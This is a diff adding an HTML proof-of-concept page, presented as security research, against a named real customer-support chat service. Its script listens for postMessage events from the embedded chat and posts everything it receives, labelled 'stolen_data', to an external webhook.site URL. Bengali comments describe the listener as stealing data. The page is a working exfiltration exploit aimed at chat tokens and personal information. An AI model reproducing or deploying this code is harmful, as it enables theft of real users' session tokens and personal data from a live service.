@@ -1,0 +1,56 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <title>Security Research - Sensitive Data Leakage Test</title>
+    <style>
+        body { font-family: sans-serif; text-align: center; padding: 50px; background-color: #f4f4f4; }
+        .box { background: white; padding: 20px; border-radius: 10px; box-shadow: 0 0 10px rgba(0,0,0,0.1); display: inline-block; }
+        button { padding: 10px 20px; background: #d93025; color: white; border: none; border-radius: 5px; cursor: pointer; }
+    </style>
+</head>
+<body>
+
+    <div class="box">
+        <h1>Critical: Sensitive Data Leakage PoC</h1>
+        <p>This page demonstrates how <b>chatterToken</b> and <b>PII</b> can be leaked via misconfigured postMessage.</p>
+        
+        <button onclick="openChat()">Click to Start Test</button>
+        
+        <p id="status" style="color: green; margin-top: 20px;"></p>
+    </div>
+
+    <iframe id="targetFrame" src="https://vidaxl-prod.ada.support/chat/?language=en" style="display:none;"></iframe>
+
+    <script>
+        // ১. আপনার Webhook URL টি এখানে দিন
+        const webhookURL = "https://webhook.site/3f1cee9e-bbda-419f-beb6-3b9481f91695"; 
+
+        function openChat() {
+            // চ্যাট উইন্ডোটি পপআপ হিসেবে ওপেন করা
+            window.open("https://vidaxl-prod.ada.support/chat/?language=en", "chat", "width=400,height=600");
+            document.getElementById('status').innerText = "Testing in progress... Check your Webhook.";
+        }
+
+        // ২. postMessage লিসেনার - যা ডাটা চুরি করবে
+        window.addEventListener("message", function(event) {
+            // ডাটা ফিল্টার করা (শুধু সেনসিটিভ কিছু থাকলে ধরবে)
+            if (event.data) {
+                console.log("Captured Data:", event.data);
+
+                // ৩. ডাটা সরাসরি আপনার ওয়েববুকে পাঠিয়ে দেওয়া
+                fetch(webhookURL, {
+                    method: 'POST',
+                    mode: 'no-cors',
+                    body: JSON.stringify({
+                        vulnerability: "PostMessage Misconfiguration",
+                        origin: event.origin,
+                        stolen_data: event.data,
+                        timestamp: new Date().toISOString()
+                    })
+                });
+            }
+        }, false);
+    </script>
+</body>
+</html>
